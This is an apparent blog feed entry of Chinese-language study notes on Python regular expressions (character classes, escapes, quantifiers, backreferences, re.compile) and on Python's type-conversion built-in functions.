    <updated>2023-03-14T10:28:28.455Z</updated>
    
    <content type="html"><![CDATA[<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>匹配单个字符<br>字符功能位置<br>.匹配任意1个字符（除了\n）<br>[ ]匹配[ ]中列举的字符<br>\d匹配数字，即0-9可以写在字符集[…]中<br>\D匹配⾮数字，即不是数字可以写在字符集[…]中<br>\s匹配空⽩，即空格，tab键可以写在字符集[…]中<br>\S匹配⾮空⽩字符可以写在字符集[…]中<br>\w匹配单词字符，即a-z、A-Z、0-9、_可以写在字符集[…]中<br>\W匹配⾮单词字符可以写在字符集[…]中</p><h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>\cx</td><td>匹配由x指明的控制字符。例如，<code> \cM</code> 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于 <code>\x0c</code> 和 <code>\cL</code>。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于 <code>\x0a </code>和<code> \cJ</code>。</td></tr><tr><td>\r</td><td>匹配一个回车符。等价于 <code>\x0d</code> 和 <code>\cM</code>。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 <code>[ \f\n\r\t\v]</code>。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于<code> [^ \f\n\r\t\v]</code>。</td></tr><tr><td>\t</td><td>匹配一个制表符。等价于<code> \x09</code> 和 <code>\cI</code>。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于 <code>\x0b</code> 和 <code>\cK</code>。</td></tr></tbody></table><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a><strong>特殊字符</strong></h3><table><thead><tr><th>特别字符</th><th>描述</th></tr></thead><tbody><tr><td>$</td><td>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用<code> \$</code>。</td></tr><tr><td>( )</td><td>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 <code>\(</code> 和 <code>\)</code>。</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 <code>\*</code>。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 <code>\+</code>。</td></tr><tr><td>.</td><td>匹配除换行符 \n之外的任何单字符。要匹配 .，请使用<code> \.</code>。</td></tr><tr><td>[</td><td>标记一个中括号表达式的开始。要匹配 [，请使用 <code>\[</code>。</td></tr><tr><td>?</td><td>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用<code> \?</code>。</td></tr><tr><td>\</td><td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td></tr><tr><td>^</td><td>匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 <code>\^</code>。</td></tr><tr><td>{</td><td>标记限定符表达式的开始。要匹配 {，请使用<code> \&#123;</code>。</td></tr><tr><td>|</td><td>指明两项之间的一个选择。要匹配 |，请使用 <code>|</code>。</td></tr></tbody></table><h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a><strong>限定符</strong></h3><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>*</td><td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td></tr><tr><td>{n}</td><td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td>{n,}</td><td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td>{n,m}</td><td>m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="正则表达式的限定符有："><a href="#正则表达式的限定符有：" class="headerlink" title="正则表达式的限定符有："></a>正则表达式的限定符有：</h3><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>^</td><td>匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 <code>\n</code> 或<code> \r</code> 之后的位置匹配。</td></tr><tr><td>$</td><td>匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与<code>\n</code>或 <code>\r</code> 之前的位置匹配。</td></tr><tr><td>\b</td><td>匹配一个字边界，即字与空格间的位置。</td></tr><tr><td>\B</td><td>非字边界匹配。</td></tr></tbody></table><h4 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile 函数"></a>compile 函数</h4><p><a href="https://blog.csdn.net/weixin_42793426/article/details/88545939">(72条消息) 正则表达式re.compile()的使用_艾莉宝贝的博客-CSDN博客_re.compile()</a></p><p><strong>compile 函数用于编译正则表达式，生成一个 Pattern 对象</strong>，它的一般使用形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(pattern[, flag])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 将正则表达式编译成 Pattern 对象 </span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d+&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面，我们已将一个正则表达式编译成 Pattern 对象，接下来，我们就可以利用 pattern 的一系列方法对文本进行匹配查找了。Pattern 对象的一些常用方法主要有：</p><p>match 方法<br>search 方法<br>findall 方法<br>finditer 方法<br>split 方法<br>sub 方法<br>subn 方法</p><p><strong>Python中要实现字符与ASCII码之间的相互转化可使用Python自带的函数：chr() 和 ord()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(x [,base ]) 将x转换为一个整数 可以<span class="number">16</span>进制转<span class="number">10</span>进制  <span class="built_in">int</span>(x,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">long(x [,base ]) 将x转换为一个长整数</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>(x ) 将x转换到一个浮点数</span><br><span class="line"></span><br><span class="line"><span class="built_in">complex</span>(real [,imag ]) 创建一个复数</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>(x ) 将对象 x 转换为字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">repr</span>(x ) 将对象 x 转换为表达式字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span> ) 用来计算在字符串中的有效Python表达式,并返回一个对象</span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span>(s ) 将序列 s 转换为一个元组</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>(s ) 将序列 s 转换为一个列表</span><br><span class="line"></span><br><span class="line"><span class="built_in">chr</span>(x ) 将一个整数转换为一个字符</span><br><span class="line"></span><br><span class="line">unichr(x ) 将一个整数转换为Unicode字符</span><br><span class="line"></span><br><span class="line"><span class="built_in">ord</span>(x ) 将一个字符转换为它的整数值</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span>(x ) 将一个整数转换为一个十六进制字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">oct</span>(x ) 将一个整数转换为一个八进制字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span>() 将一个整数转换二进制字符串</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;re&quot;&gt;&lt;a href=&quot;#re&quot; class=&quot;headerlink&quot; title=&quot;re&quot;&gt;&lt;/a&gt;re&lt;/h2&gt;&lt;p&gt;匹配单个字符&lt;br&gt;字符	功能	位置&lt;br&gt;.	匹配任意1个字符（除了\n）	&lt;br&gt;[ ]	匹配[ ]中列举的字符	&lt;br&gt;\d	匹配数字</summary>
      
    
    
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
</feed>
